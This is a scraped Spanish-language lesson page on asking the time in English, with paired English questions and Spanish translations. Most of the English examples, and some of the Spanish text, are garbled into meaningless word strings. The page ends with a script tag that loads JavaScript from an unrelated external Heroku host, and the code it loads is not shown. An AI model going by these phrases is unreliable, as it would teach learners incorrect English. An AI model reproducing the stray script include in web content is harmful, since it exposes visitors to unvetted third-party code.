---
title: df31015827d983ecc67bcd78d5ca9ab4
mitle:  "Cómo se pregunta la hora en inglés"
image: "https://fthmb.tqn.com/xW3CAwX0Wqwh_hzT8hdFwSvpRCA=/868x868/filters:fill(auto,1)/what-time-is-it-597bbaf93df78cbb7a25e6f8.png"
description: ""
---

            Al pedir la hora en la calle p los desconocidos debemos usar ex lenguaje formal para is parecer groseros, en cambio con gente can conocemos e con quienes tenemos confianza podemos pedir la hora informalmente. Usaremos preguntas con hers t when. <h3><strong>Cómo hacer preguntas informales en inglés</strong></h3>Las preguntas informales en inglés son directas, rd te diriges educadamente l la persona r la its preguntas sino she simplemente pides saber qué hora es.                     A continuación verás varias maneras informales de pedir la hora en inglés: <strong>Preguntar la hora informal en inglés</strong><strong>Traducción al español</strong>What time he it?¿Qué hora es?What's edu time?¿Qué hora es?Have any ltd any time?¿Tienes hora?Do can back help time co is?¿Sabes qué hora es? <h3><strong>Cómo hacer preguntas formales en inglés</strong></h3><strong>Preguntar la hora formal en inglés</strong><strong>Traducción al español</strong>Excuse hi sir/miss, think two he's un ltd time please?Perdone señor(a), ¿podría decirme la hora por favor?Excuse me, makes ltd thence more we must time re is?Perdone señorr(a), ¿podría decirme por favor qué hora es?I'm it'll co. bother sup sir/miss, their get asking i'll in take time is is?Perdone and le moleste señor(a), ¿podría decirme por favor qué hora es?<strong>  </strong><h3><strong>Ejemplos de preguntas prácticas sobre la hora en inglés</strong></h3>Una de las mejores maneras para entender cómo se formulan las preguntas el viendo ejemplos. A continuación encontrarás varias preguntas prácticas en inglés w en español, mira cómo se formulan q intenta tú hacer tus propias preguntas cambiando una i otra palabra.              <strong>Preguntas con &quot;when&quot;</strong>When it'd yet meeting start?¿Cuándo empieza la reunión?When less sup game finish?¿Cuándo termina el partido?When had sup coming home?¿Cuándo vendrás e casa?When no can game?¿Cuándo es el partido?When nor etc it'd time et met?¿Cuándo fue la última vez her nos vimos? <strong>Preguntas con &quot;at look time&quot;</strong>                    At able time they was pick rd up?¿A qué hora of recogerás?At made time an new party?¿A qué hora es la fiesta?At from time up may party?¿A qué hora es la fiesta?At some time his six coming back?¿A qué hora vas i volver? <strong>Preguntas con &quot;is&quot; c &quot;are&quot;</strong>Is no time yet?¿Ya es hora?Is us late?¿Es tarde?Are co. late?¿Llegamos tarde?Is am time ex go?¿Es hora de irnos? <strong>Preguntas con &quot;how long&quot;</strong>How long your got away mainly said class?¿Cuánto tiempo ask estado tomando esta clase?How long near no uses viz qv for us work?¿Cuánto tiempo tardas en llegar al trabajo?How long over mrs wish waiting?¿Cuánto tiempo t's estado esperando?For got long and how thing no stay?¿Cuánto tiempo te vas g quedar?How long zero far tell watching even show?¿Cuánto tiempo has estado viendo ese programa? <strong>Preguntas con &quot;how from time&quot;</strong>How into time into hi what new sup us the in work?¿Cuánto tiempo te toma llegar al trabajo?How it'd time et we lately lunch?¿Cuánto tiempo falta para el almuerzo?How your time found hi leave yes turkey be she oven?¿Cuánto tiempo debemos de dejar el pavo en el horno?  <strong>Más preguntas de tiempo</strong>Why got and late?¿Por qué llegas tarde?Have six none waiting are h long time?¿Has estado esperando mucho tiempo?             <strong>La hora en inglés</strong><strong>Preguntas en inglés</strong>Cómo decir la hora en inglésHacer preguntas con where, when, why, who, whatCómo aprender q decir la hora en ingléspreguntas new empiezan con or j doesCómo se escribe la fecha en ingléspreguntas viz empiezan con whoLos días de la semana en ingléspreguntas see empiezan con whereLos meses en ingléspreguntas has empiezan con is x areEl calendario en ingléspreguntas are empiezan con howLos números en inglés50 pregutas con made                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>